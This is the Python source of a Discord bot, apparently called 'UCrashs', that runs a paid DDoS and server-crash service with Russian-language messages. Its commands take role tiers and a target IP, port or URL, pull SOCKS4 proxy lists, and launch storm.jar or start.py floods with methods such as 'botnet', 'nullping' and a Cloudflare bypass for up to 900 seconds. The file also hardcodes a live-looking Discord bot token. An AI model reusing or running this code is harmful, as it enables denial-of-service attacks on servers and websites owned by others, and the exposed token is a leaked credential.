import nest_asyncio

nest_asyncio.apply()
import slot
import asyncio
import discord
from discord.ext import commands
import subprocess
import threading
import os
import json
import urllib.request

########################################
jar = "storm.jar"
zombie = False
bot_token = "OTc3OTkyNTQ3MTM5OTg1NDc4.GelALp.Y2RwIpHhKHXvtCpn_Y1wQp9mQfGVBOjUc5kUcc"
wmeth_list = ['STRESS', 'POST', 'CFB', 'GET', 'BYPASS', 'BOT', 'HEAD', 'DYN', 'CFBUAM', 'EVEN', 'NULL', 'COOKIE',
              'SLOW', 'DOWNLOADER', 'XMLRPC', 'KILLER', 'STOMP']
methods_all = ['join',
               'legitjoin',
               'localhost',
               'invaldnames',
               'longnames',
               'power',
               'spoof',
               'spam',
               'killer',
               'nullping',
               'charonbot',
               'packet',
               'queue',
               'sf',
               'ultimatesmasher',
               'nabcry',
               'colorcrasher',
               'yoonikscry',
               'nettydowner',
               'bigpacket',
               'network',
               'bighandshake',
               'randombytes',
               'botjoiner',
               'ping',
               'multikiller',
               'extremejoin',
               'spamjoin',
               'ram',
               'botnet']
methods_ultra = [1, 2, 3, 4, 5, 6, 7]
channels = [952134763270008893, 952134816285986857, 952134888209924146]
########################################
############## Настройки планов ##############

free = [25, 25000]
free_role = 939822458012311613
freeplus = [35, 35000]
freeplus_role = 939822846547492946
average = [45, 45000]
average_role = 939823493162344508
maximum = [60, 60000]
maximum_role = 939823960755945482
pro = [100, 180000]
pro_role = 939824524642357278
infinity = [230, 999999999]
infinity_role = 950091399041282048
#############################################

web_role = 981124240088657970

##############################################

############### BlackList ####################
blacklist_ip = ['127.0.0.1', 'localhost', '0.0.0.0']
##############################################

############## Сокращения ##############
bot = commands.Bot(command_prefix='%')
client = discord.Client()


########################################

######################################################################################

################################ Команды при присоединении бота ########################################################
########################################################################################################################

#################### def #####################
async def blist(ip):
    for i in blacklist_ip:
        if i == ip:
            return True
        else:
            return False

async def proxy_nmsg():
    def update():
        os.system('rm proxies.txt')
        os.system('curl -o proxies.txt "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all"')
    t1 = threading.Thread(target=update)
    t1.start()

async def isInt(s):
    try:
        float(s)
        return True
    except ValueError:
        return False


##############################################
@bot.command(name='wmeth')
async def wmeth(ctx):
    embed = discord.Embed(title=":file_folder: [Methods]",
                          description='[\'STRESS\',\'POST\',\'CFB\',\'GET\',\'BYPASS\',\'BOT\', \'HEAD\',\'DYN\',\'EVEN\',\'NULL\',\'COOKIE\',\'SLOW\',\'DOWNLOADER\',\'XMLRPC\',\'KILLER\',\'STOMP\',,\'CFBUAM\']\nПисать капсом!')
    await ctx.send(embed=embed)


@commands.has_role(web_role)
@bot.command(name='web')
async def web_(ctx, url, method, time):
    await proxy_nmsg()
    if ctx.channel.id in channels:
        if method in wmeth_list:
            if int(time) < 90:
                embed = discord.Embed(title=':white_check_mark: [Атака отправлена успешно]', description='',
                                      color=discord.Color(0x2F3136))
                embed.add_field(name=':globe_with_meridians: [URL]', value=f'{url}')
                embed.add_field(name=':file_folder: [Method]', value=f'{method}')
                embed.add_field(name=':timer_clock: [Time]', value=f'{time}')
                subprocess.Popen(f'timeout {time}s python3 start.py {method} {url} 0 5000 proxies.txt 61 {time}',
                                 shell=True)
                await ctx.send(embed=embed)


@bot.command(name='vip')
@commands.has_role(928370273919565825)
async def vip(ctx, arg1, arg3, *, arg4):
    if ctx.channel.id in channels:
        if int(arg3) > 120:
            await ctx.send(f":x: [Ошибка]: Максимум времени - 120 секунд! Вы указали {arg3}.")
        else:
            conftext = f'infoFormat: 1 \nbotsCount: 1 \njoinDelay: 1 \nrandomNicks: true \nrandomNicksLength: 8 \nrandomPasswords: true \nrandomPasswordsLength: 8 \ndoubleJoin: true \nantiBotFilter: false \ntestMode: true \ntestModeIp: "{arg1}" \nautoRestart: false \nautoRestartDelay: 1 \nmove: false \ncommands: \n  - "wait 2s" \n  - "{arg4}"'
            conf = open("config.yml", "w+")
            conf.write(conftext)
            conf.close()
            embed = discord.Embed(title=":white_check_mark: [Атака успешно отправлена]", color=discord.Color(0x2F3136))
            embed.add_field(name=f":globe_with_meridians: [Сервер] ", value=f"{arg1}", inline=False)
            embed.add_field(name=f':timer_clock: [Время] ', value=f'{arg3} секунд(ы)', inline=False)
            embed.add_field(name=f':capital_abcd: [Текст спама] ', value=f'{arg4}', inline=False)
            embed.set_footer(text="")
            # embed.set_image(url="https://media.discordapp.net/attachments/952132257404059678/954437033017876510/deadicon.gif")
            await ctx.send(embed=embed)
            startcmd = f"timeout {arg3}s java -Xmx2G -jar bot.jar"
            subprocess.Popen(startcmd, shell=True)
    else:
        await ctx.send(":x: [Ошибка]: неверный канал!")


############################################ Команды бота ##############################################################
@bot.command(name="protocols")
async def protocols_(self):
    embed = discord.Embed(
        title='',
        description=f""":desktop_computer: [Протоколы]:
`1.18.1 - 757
1.17.1 - 756
1.17 - 755
1.16.5 - 754
1.16.4 - 754
1.16.3 - 753
1.16.2 - 751
1.16.1 - 736
1.16 - 735
1.15.2 - 578
1.15.1 - 575
1.15 - 573
1.14.4 - 498
1.14.3 - 490
1.14.2 - 485
1.14.1 - 480
1.14 - 477
1.13.2 - 404
1.13.1 - 401
1.13 - 393
1.12.2 - 340
1.12.1 - 338
1.12 - 335
1.11.2 - 316
1.11.1 - 316
1.11 - 315
1.10.2 - 210
1.10.1 - 210
1.10 - 210
1.9.4 - 110
1.9.3 - 110
1.9.2 - 109
1.9.1 - 109
1.9 - 107
1.8.9 - 47
1.8.8 - 47
1.8.7 - 47
1.8.6 - 47
1.8.5 - 47
1.8.4 - 47
1.8.3 - 47
1.8.2 - 47
1.8.1 - 47
1.7.10 - 5
1.7.9 - 5
1.7.8 - 5
1.7.7 - 5
1.7.6 - 5
1.7.5 - 4
1.7.4 - 4
1.7.2 - 4`""",
        color=discord.Color(0x2F3136)
    )
    embed.set_author(
        name="Протоколы", icon_url=self.bot.user.avatar_url
    )
    await self.send(embed=embed)


@bot.command(name="stop")
@commands.has_permissions(administrator=True)
async def stop_(self):
    subprocess.Popen("pkill 'java'", shell=True)
    embed = discord.Embed(title='', description=f'Все атаки остановлены!', color=discord.Color(0x2F3136))
    embed.set_author(name="Остановлено", icon_url=self.bot.user.avatar_url)
    await self.send(embed=embed)


@bot.remove_command(name="help")
@bot.command(name="help")
async def help_(self):
    if not zombie:
        msg_embed = discord.Embed(title="Help",
                                  #   description=f"""
                                  #   	    - Free атака UCrashs
                                  # 	   %freeplus <ip:port> <protocol/version> <method> - freeplus атака UCrashs
                                  # 	   %average <ip:port> <protocol/version> <method> - average атака UCrashs
                                  # 	   %maximum <ip:port> <protocol/version> <method> - maximum атака UCrashs
                                  # 	   %pro <ip:port> <protocol/version> <method> <time> <cps> - pro атака UCrashs
                                  # 	   %infinity <ip:port> <protocol/version> <method> <time> <cps> - Infinity атака UCrashs

                                  # 	   %help - Меню помощи.
                                  # 	   %methods - Список методов.
                                  # 	   %stop - Остановить все атаки. (Admin only)
                                  # 	   %protocols - Список протоколов
                                  # 	   %resolve <ip:port> - Получить цифровой IP
                                  # 	   %proxy - Обновить Proxy
                                  # 	   """,
                                  description='',
                                  color=discord.Color(0x2F3136))
        msg_embed.set_author(
            name="Помощь", icon_url=self.bot.user.avatar_url
        )
        msg_embed.add_field(name=':boom: Free Attack', value='%free <ip:port> <protocol/version> <method>',
                            inline=False)
        msg_embed.add_field(name=':boom: FreePlus Attack', value='%freeplus <ip:port> <protocol/version> <method>',
                            inline=False)
        msg_embed.add_field(name=':boom: Average Attack', value='%average <ip:port> <protocol/version> <method>',
                            inline=False)
        msg_embed.add_field(name=':boom: Max Attack', value='%maximum <ip:port> <protocol/version> <method>',
                            inline=False)

        msg_embed.add_field(name=':boom: Pro Attack', value='%pro <ip:port> <protocol/version> <method> <time> <cps>',
                            inline=False)
        msg_embed.add_field(name=':boom: Infinity Attack',
                            value='%infinity <ip:port> <protocol/version> <method> <time> <cps>', inline=False)

        msg_embed.add_field(name=':boom: Ultra Attack', value='%ultra <ip:port> <method-id> <power> <protocol> <time>',
                            inline=False)

        msg_embed.add_field(name=':boom: HTTP/HTTPS Attack', value='%web <url> <method> <time>', inline=False)
        msg_embed.add_field(name=':file_folder: Methods of WEB', value='%wmeth')

        msg_embed.add_field(name=':file_folder: Methods', value='%methods', inline=False)
        msg_embed.add_field(name=':file_folder: Methods of Ultra', value='%umethods', inline=False)
        msg_embed.add_field(name=':globe_with_meridians: Protocols', value='%protocols', inline=False)
        msg_embed.add_field(name=':printer: Resolve', value='%resolve <ip:port>', inline=False)

        msg_embed.add_field(name=':boom: VipSpam Attack 1.12.2',
                            value='%vip <ip:port> <time 120 sec maximum> <message>', inline=False)
        await self.send(embed=msg_embed)


@bot.command(name="methods")
async def methods_(self):
    if not zombie:
        msg_embed = discord.Embed(title="",
                                  description=f"""
['join',
'legitjoin',
'localhost',
'invaldnames',
'longnames',
'power',
'spoof',
'spam',
'killer',
'nullping',
'charonbot',
'packet',
'queue',
'sf',
'ultimatesmasher',
'nabcry',
'colorcrasher',
'yoonikscry',
'nettydowner',
'bigpacket',
'network',
'bighandshake',
'randombytes',
'botjoiner',
'ping',
'multikiller',
'extremejoin',
'spamjoin',
'ram',
'botnet']""",
                                  color=discord.Color(0x2F3136))
        msg_embed.set_author(
            name="Методы", icon_url=self.bot.user.avatar_url
        )
        await self.send(embed=msg_embed)


@bot.command(name="free")
@commands.has_role(free_role)
async def free_(self, ipport, protocol, method):
    if self.channel.id in channels:
        await proxy_nmsg()
        await asyncio.sleep(1.5)
        if await blist(ipport):
            msg_embed = discord.Embed(title="",
                                       description=f"{ipport} Этот сервер нельзя ддосить.",
                                      color=discord.Color(0x2F3136))
            msg_embed.set_author(
                name="Error", icon_url=self.bot.user.avatar_url
            )
            await self.send(embed=msg_embed)
        else:
            attack = True
            if attack:
                if not await blist(ipport):
                    if slot.sent:
                        if method in methods_all:
                            proto = protocol.replace("1.8", "47").replace("1.9", "107").replace("1.10", "210").replace(
                                "1.11", "315").replace("1.12", "335").replace("1.12.2", "340").replace("1.13",
                                                                                                       "393").replace(
                                "1.14", "477").replace("1.15", "573").replace("1.16", "735").replace("1.16.5",
                                                                                                     "754").replace(
                                "1.17", "755").replace("1.18", "757").replace("1.18.1", "757").replace("735.5",
                                                                                                       "754").replace(
                                "335.2", "340").replace("757.1", "757")
                            msg_embed = discord.Embed(
                                title='Атака отправлена!',
                                description='',
                                color=discord.Color(0x2F3136)
                            )
                            msg_embed.set_author(name="UCrashs", icon_url=self.bot.user.avatar_url)
                            msg_embed.add_field(name=':boom: [Айпи]', value=f'{ipport}', inline=False)
                            msg_embed.add_field(name=':globe_with_meridians: [Протокол]', value=f'{proto}', inline=False)
                            msg_embed.add_field(name=':file_folder: [Метод]', value=f'{method}', inline=False)
                            msg_embed.add_field(name=':timer_clock: [Время]', value=f'{free[0]}', inline=False)
                            msg_embed.add_field(name=':crossed_swords: [Скорость]', value=f'{free[1]}', inline=False)
                            #)
                            msg_embed.set_footer(text="UCrashs by UltraGames")
                            await self.send(embed=msg_embed)
                            subprocess.Popen(f"java -jar {jar} {ipport} {proto} {method} {free[0]} {free[1]}",
                                             shell=True)
                            f = open('slot.py' 'w')
                            f.write('sent=False')
                            await asyncio.sleep(free[0])
                            f.write('sent=True')
                        else:
                            await methods_(self)
                    else:
                        pass
            else:
                msg_embed = discord.Embed(title="ERROR",
                                          description=f"",
                                          color=discord.Color(0x2F3133))
                msg_embed.add_field(name='ОШИБКА', value=f'У вас нет прав', inline=False)
    else:
        pass


@bot.command(name="freeplus")
@commands.has_role(freeplus_role)
async def freeplus_(self, ipport, protocol, method):
    if self.channel.id in channels:
        await proxy_nmsg()
        await asyncio.sleep(1.5)
        if await blist(ipport):
            if not zombie:
                msg_embed = discord.Embed(title="",
                                          description=f"{ipport} Этот сервер нельзя ддосить.",
                                          color=discord.Color(0x2F3136))
                msg_embed.set_author(
                    name="Error", icon_url=self.bot.user.avatar_url
                )
                await self.send(embed=msg_embed)
        else:
            attack = True
            if attack:
                if not await blist(ipport):
                    if slot.sent:
                        if method in methods_all:
                            proto = protocol.replace("1.8", "47").replace("1.9", "107").replace("1.10", "210").replace(
                                "1.11", "315").replace("1.12", "335").replace("1.12.2", "340").replace("1.13",
                                                                                                       "393").replace(
                                "1.14", "477").replace("1.15", "573").replace("1.16", "735").replace("1.16.5",
                                                                                                     "754").replace(
                                "1.17", "755").replace("1.18", "757").replace("1.18.1", "757").replace("735.5",
                                                                                                       "754").replace(
                                "335.2", "340").replace("757.1", "757")
                            msg_embed = discord.Embed(
                                title='Атака отправлена!',
                                description='',
                                color=discord.Color(0x2F3136)
                            )
                            msg_embed.set_author(name="UCrashs", icon_url=self.bot.user.avatar_url)
                            msg_embed.add_field(name=':boom: [Айпи]', value=f'{ipport}', inline=False)
                            msg_embed.add_field(name=':globe_with_meridians: [Протокол]', value=f'{proto}', inline=False)
                            msg_embed.add_field(name=':file_folder: [Метод]', value=f'{method}', inline=False)
                            msg_embed.add_field(name=':timer_clock: [Время]', value=f'{freeplus[0]}', inline=False)
                            msg_embed.add_field(name=':crossed_swords: [Скорость]', value=f'{freeplus[1]}', inline=False)
                            #)
                            msg_embed.set_footer(text="UCrashs by UltraGames")
                            await self.send(embed=msg_embed)
                            subprocess.Popen(f"java -jar {jar} {ipport} {proto} {method} {freeplus[0]} {freeplus[1]}",
                                             shell=True)
                            f = open('slot.py' 'w')
                            f.write('sent=False')
                            await asyncio.sleep(freeplus[0])
                            f.write('sent=True')
                        else:
                            await methods_(self)
                    else:
                        pass
            else:
                msg_embed = discord.Embed(title="ERROR",
                                          description=f"",
                                          color=discord.Color(0x2F3133))
                msg_embed.add_field(name='ОШИБКА', value=f'У вас нет прав', inline=False)
    else:
        pass


@bot.command(name="average")
@commands.has_role(average_role)
async def average_(self, ipport, protocol, method):
    if self.channel.id in channels:
        await proxy_nmsg()
        await asyncio.sleep(1.5)
        if await blist(ipport):
            if not zombie:
                msg_embed = discord.Embed(title="",
                                          description=f"{ipport} Этот сервер нельзя ддосить.",
                                          color=discord.Color(0x2F3136))
                msg_embed.set_author(
                    name="Error", icon_url=self.bot.user.avatar_url
                )
                await self.send(embed=msg_embed)
        else:
            attack = True
            if attack:
                if not await blist(ipport):
                    if slot.sent:
                        if method in methods_all:
                            proto = protocol.replace("1.8", "47").replace("1.9", "107").replace("1.10", "210").replace(
                                "1.11", "315").replace("1.12", "335").replace("1.12.2", "340").replace("1.13",
                                                                                                       "393").replace(
                                "1.14", "477").replace("1.15", "573").replace("1.16", "735").replace("1.16.5",
                                                                                                     "754").replace(
                                "1.17", "755").replace("1.18", "757").replace("1.18.1", "757").replace("735.5",
                                                                                                       "754").replace(
                                "335.2", "340").replace("757.1", "757")
                            msg_embed = discord.Embed(
                                title='Атака отправлена!',
                                description='',
                                color=discord.Color(0x2F3136)
                            )
                            msg_embed.set_author(name="UCrashs", icon_url=self.bot.user.avatar_url)
                            msg_embed.add_field(name=':boom: [Айпи]', value=f'{ipport}', inline=False)
                            msg_embed.add_field(name=':globe_with_meridians: [Протокол]', value=f'{proto}', inline=False)
                            msg_embed.add_field(name=':file_folder: [Метод]', value=f'{method}', inline=False)
                            msg_embed.add_field(name=':timer_clock: [Время]', value=f'{average[0]}', inline=False)
                            msg_embed.add_field(name=':crossed_swords: [Скорость]', value=f'{average[1]}', inline=False)
                            #)
                            msg_embed.set_footer(text="UCrashs by UltraGames")
                            await self.send(embed=msg_embed)
                            subprocess.Popen(f"java -jar {jar} {ipport} {proto} {method} {average[0]} {average[1]}",
                                             shell=True)
                            f = open('slot.py' 'w')
                            f.write('sent=False')
                            await asyncio.sleep(average[0])
                            f.write('sent=True')
                        else:
                            await methods_(self)
                    else:
                        pass
    else:
        pass


@bot.command(name="maximum")
@commands.has_role(maximum_role)
async def maximum_(self, ipport, protocol, method):
    if self.channel.id in channels:
        await proxy_nmsg()
        await asyncio.sleep(1.5)
        if await blist(ipport):
            if not zombie:
                msg_embed = discord.Embed(title="",
                                          description=f"{ipport} Этот сервер нельзя ддосить.",
                                          color=discord.Color(0x2F3136))
                msg_embed.set_author(
                    name="Error", icon_url=self.bot.user.avatar_url
                )
                await self.send(embed=msg_embed)
        else:
            attack = True
            if attack:
                if not await blist(ipport):
                    if slot.sent:
                        if method in methods_all:
                            proto = protocol.replace("1.8", "47").replace("1.9", "107").replace("1.10", "210").replace(
                                "1.11", "315").replace("1.12", "335").replace("1.12.2", "340").replace("1.13",
                                                                                                       "393").replace(
                                "1.14", "477").replace("1.15", "573").replace("1.16", "735").replace("1.16.5",
                                                                                                     "754").replace(
                                "1.17", "755").replace("1.18", "757").replace("1.18.1", "757").replace("735.5",
                                                                                                       "754").replace(
                                "335.2", "340").replace("757.1", "757")
                            msg_embed = discord.Embed(
                                title='Атака отправлена!',
                                description='',
                                color=discord.Color(0x2F3136)
                            )
                            msg_embed.set_author(name="UCrashs", icon_url=self.bot.user.avatar_url)
                            msg_embed.add_field(name=':boom: [Айпи]', value=f'{ipport}', inline=False)
                            msg_embed.add_field(name=':globe_with_meridians: [Протокол]', value=f'{proto}', inline=False)
                            msg_embed.add_field(name=':file_folder: [Метод]', value=f'{method}', inline=False)
                            msg_embed.add_field(name=':timer_clock: [Время]', value=f'{maximum[0]}', inline=False)
                            msg_embed.add_field(name=':crossed_swords: [Скорость]', value=f'{maximum[1]}', inline=False)
                            #)
                            msg_embed.set_footer(text="UCrashs by UltraGames")
                            await self.send(embed=msg_embed)
                            subprocess.Popen(f"java -jar {jar} {ipport} {proto} {method} {maximum[0]} {maximum[1]}",
                                             shell=True)
                            f = open('slot.py' 'w')
                            f.write('sent=False')
                            await asyncio.sleep(maximum[0])
                            f.write('sent=True')
                        else:
                            await methods_(self)
                    else:
                        pass
            else:
                msg_embed = discord.Embed(title="ERROR",
                                          description=f"",
                                          color=discord.Color(0x2F3133))
                msg_embed.add_field(name='ОШИБКА', value=f'У вас нет прав', inline=False)
    else:
        pass


@bot.command(name="pro")
@commands.has_role(pro_role)
async def pro_(self, ipport, protocol, method, time, cps):
    if self.channel.id in channels:
        await proxy_nmsg()
        await asyncio.sleep(1.5)
        if await blist(ipport):
            if not zombie:
                msg_embed = discord.Embed(title="",
                                          description=f"{ipport} Этот сервер нельзя ддосить.",
                                          color=discord.Color(0x2F3136))
                msg_embed.set_author(
                    name="Error", icon_url=self.bot.user.avatar_url
                )
                await self.send(embed=msg_embed)
        else:
            attack = True
            if attack:
                if not int(time) > 110 and not int(cps) > 180000:
                    if not await blist(ipport):
                        # if method in methods_all:
                        # 	proto = protocol.replace("1.8", "47").replace("1.9", "107").replace("1.10", "210").replace("1.11", "315").replace("1.12", "335").replace("1.12.2", "340").replace("1.13", "393").replace("1.14", "477").replace("1.15", "573").replace("1.16", "735").replace("1.16.5", "754").replace("1.17", "755").replace("1.18", "757").replace("1.18.1", "757").replace("735.5", "754").replace("335.2", "340").replace("757.1", "757")
                        # 	msg_embed=discord.Embed(
                        # 		title='Атака отправлена!',
                        # 		description='',
                        # 		color=discord.Color(0x2F3136)
                        # 	)
                        # 	msg_embed.set_author(name="UCrashs", icon_url=self.bot.user.avatar_url)
                        # 	msg_embed.add_field(name='Айпи:', value=f'{ipport}')
                        # 	msg_embed.add_field(name='Протокол:', value=f'{proto}')
                        # 	msg_embed.add_field(name='Метод:', value=f'{method}')
                        # 	msg_embed.add_field(name='Время:', value=f'{time}')
                        # 	msg_embed.add_field(name='Скорость:', value=f'{cps}')
                        # 	#)
                        # 	msg_embed.set_footer(text="UCrashs by UltraGames")
                        # 	await self.send(embed=msg_embed)
                        # 	subprocess.Popen(f"java -jar {jar} {ipport} {proto} {method} {time} {cps}",shell=True)
                        # else:
                        # 	await methods_(self)
                        if slot.sent:
                            if method in methods_all:
                                proto = protocol.replace("1.8", "47").replace("1.9", "107").replace("1.10",
                                                                                                    "210").replace(
                                    "1.11", "315").replace("1.12", "335").replace("1.12.2", "340").replace("1.13",
                                                                                                           "393").replace(
                                    "1.14", "477").replace("1.15", "573").replace("1.16", "735").replace("1.16.5",
                                                                                                         "754").replace(
                                    "1.17", "755").replace("1.18", "757").replace("1.18.1", "757").replace("735.5",
                                                                                                           "754").replace(
                                    "335.2", "340").replace("757.1", "757")
                                msg_embed = discord.Embed(
                                    title='Атака отправлена!',
                                    description='',
                                    color=discord.Color(0x2F3136)
                                )
                                msg_embed.set_author(name="UCrashs", icon_url=self.bot.user.avatar_url)
                                msg_embed.add_field(name=':boom: [Айпи]', value=f'{ipport}', inline=False)
                                msg_embed.add_field(name=':globe_with_meridians: [Протокол]', value=f'{proto}', inline=False)
                                msg_embed.add_field(name=':file_folder: [Метод]', value=f'{method}', inline=False)
                                msg_embed.add_field(name=':timer_clock: [Время]', value=f'{time}', inline=False)
                                msg_embed.add_field(name=':crossed_swords: [Скорость]', value=f'{cps}', inline=False)
                                #
                                msg_embed.set_footer(text="UCrashs by UltraGames")
                                await self.send(embed=msg_embed)
                                subprocess.Popen(f"java -jar {jar} {ipport} {proto} {method} {time} {cps}", shell=True)
                                f = open('slot.py' 'w')
                                f.write('sent=False')
                                await asyncio.sleep(time)
                                f.write('sent=True')
                            else:
                                await methods_(self)
                        else:
                            pass
                else:
                    msg_embed = discord.Embed(
                        title='Атака отправлена!',
                        description='Вы обошли огроничения!',
                        color=discord.Color(0x2F3136)
                    )
                    msg_embed.set_author(name="UCrashs", icon_url=self.bot.user.avatar_url)
                    await self.send(embed=msg_embed)
            else:
                msg_embed = discord.Embed(title="ERROR",
                                          description=f"",
                                          color=discord.Color(0x2F3133))
                msg_embed.add_field(name='ОШИБКА', value=f'У вас нет прав', inline=False)
    else:
        pass


@bot.command(name="infinity")
@commands.has_role(infinity_role)
async def infinity_(self, ipport, protocol, method, time, cps):
    if self.channel.id in channels:
        await proxy_nmsg()
        await asyncio.sleep(1.5)
        if await blist(ipport):
            if not zombie:
                msg_embed = discord.Embed(title="",
                                          description=f"{ipport} Этот сервер нельзя ддосить.",
                                          color=discord.Color(0x2F3136))
                msg_embed.set_author(
                    name="Error", icon_url=self.bot.user.avatar_url
                )
                await self.send(embed=msg_embed)
        else:
            attack = True
            if attack:
                if not int(time) > 900 and not int(cps) > 999999999:
                    if not await blist(ipport):
                        if slot.sent:
                            if method in methods_all:
                                proto = protocol.replace("1.8", "47").replace("1.9", "107").replace("1.10",
                                                                                                    "210").replace(
                                    "1.11", "315").replace("1.12", "335").replace("1.12.2", "340").replace("1.13",
                                                                                                           "393").replace(
                                    "1.14", "477").replace("1.15", "573").replace("1.16", "735").replace("1.16.5",
                                                                                                         "754").replace(
                                    "1.17", "755").replace("1.18", "757").replace("1.18.1", "757").replace("735.5",
                                                                                                           "754").replace(
                                    "335.2", "340").replace("757.1", "757")
                                msg_embed = discord.Embed(
                                    title='Атака отправлена!',
                                    description='',
                                    color=discord.Color(0x2F3136)
                                )
                                msg_embed.set_author(name="UCrashs", icon_url=self.bot.user.avatar_url)
                                msg_embed.add_field(name=':boom: [Айпи]', value=f'{ipport}', inline=False)
                                msg_embed.add_field(name=':globe_with_meridians: [Протокол]', value=f'{proto}', inline=False)
                                msg_embed.add_field(name=':file_folder: [Метод]', value=f'{method}', inline=False)
                                msg_embed.add_field(name=':timer_clock: [Время]', value=f'{time}', inline=False)
                                msg_embed.add_field(name=':crossed_swords: [Скорость]', value=f'{cps}', inline=False)
                                #)
                                msg_embed.set_footer(text="UCrashs by UltraGames")
                                await self.send(embed=msg_embed)
                                subprocess.Popen(f"java -jar {jar} {ipport} {proto} {method} {time} {cps}", shell=True)
                                f = open('slot.py' 'w')
                                f.write('sent=False')
                                await asyncio.sleep(time)
                                f.write('sent=True')
                            else:
                                await methods_(self)
                        else:
                            pass
                else:
                    msg_embed = discord.Embed(
                        title='Атака отправлена!',
                        description='Вы обошли огроничения!',
                        color=discord.Color(0x2F3136)
                    )
                    msg_embed.set_author(name="UCrashs", icon_url=self.bot.user.avatar_url)
                    await self.send(embed=msg_embed)
            else:
                msg_embed = discord.Embed(title="ERROR",
                                          description=f"",
                                          color=discord.Color(0x2F3133))
                msg_embed.add_field(name='ОШИБКА', value=f'У вас нет прав', inline=False)
    else:
        pass


@bot.command()
@commands.has_role(928374440260145154)
async def proxy(ctx):
    def update():
        os.system('rm proxies.txt')
        os.system('curl -o proxies.txt "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all"')
    t1 = threading.Thread(target=update)
    t1.start()
    with open('proxies.txt') as f:
        text = f.read()
        lines = text.count('\n') + 1
    await asyncio.sleep(1)
    await ctx.send(f'{lines} Proxies Loaded & Checked')


@bot.command()
async def resolve(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="Успешно!",
        color=discord.Colour.red()
    )
    if json_object["online"] == "True":
        status = "Выключен / не могу получить данные"
        embed.add_field(name='Айпи:', value=json_object["ip"], inline=True)
        embed.add_field(name='Порт:', value=json_object["port"], inline=True)
        embed.add_field(name="Хост:", value=json_object["hostname"], inline=True)
        embed.add_field(name="Статус сервера:", value=f"{status}", inline=True)

        g = json_object["ip"]
        gb = json_object["port"]

        # embed.set_thumbnail(
        #    url='https://cdn.discordapp.com/attachments/911104008968609834/911190533458780170/chupapi-munjanja-ne-budet-6.jpg')
        embed.set_image(url=f'http://status.mclive.eu/MegaResolver/{g}/{gb}/banner.png')
        embed.set_footer(text="UCrashs by UltraGames")
        await ctx.send(embed=embed)
    else:
        statas = "Включён"
        embed.add_field(name='Айпи:', value=json_object["ip"], inline=True)
        embed.add_field(name='Порт:', value=json_object["port"], inline=True)
        embed.add_field(name="Хост:", value=json_object["hostname"], inline=True)
        embed.add_field(name="Статус сервера:", value=statas, inline=True)

        g = json_object["ip"]
        gb = json_object["port"]

        # embed.set_thumbnail(
        #    url='https://cdn.discordapp.com/attachments/911104008968609834/911190533458780170/chupapi-munjanja-ne-budet-6.jpg')
        embed.set_image(url=f'http://status.mclive.eu/MegaResolver/{g}/{gb}/banner.png')
        embed.set_footer(text="UCrashs by UltraGames")
        await ctx.send(embed=embed)


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        em = discord.Embed(title=f"Ошибка.", description=f"Команда не найдена.", color=discord.Color(0x2F3133))
        await ctx.send(embed=em)
    if isinstance(error, commands.MissingRequiredArgument):
        em = discord.Embed(title=f"Ошибка.", description=f"Укажи аргументы правильно.", color=discord.Color(0x2F3133))
        em.add_field(name="Помощь:", value="%help", inline=True)
        await ctx.send(embed=em)
    if isinstance(error, commands.MissingRole):
        em = discord.Embed(title=f"Ошибка.", description=f"У тебя нету прав.", color=discord.Color(0x2F3133))
        await ctx.send(embed=em)


########################################################################################################################

######## Запуск бота ########
bot.run(bot_token)
#############################
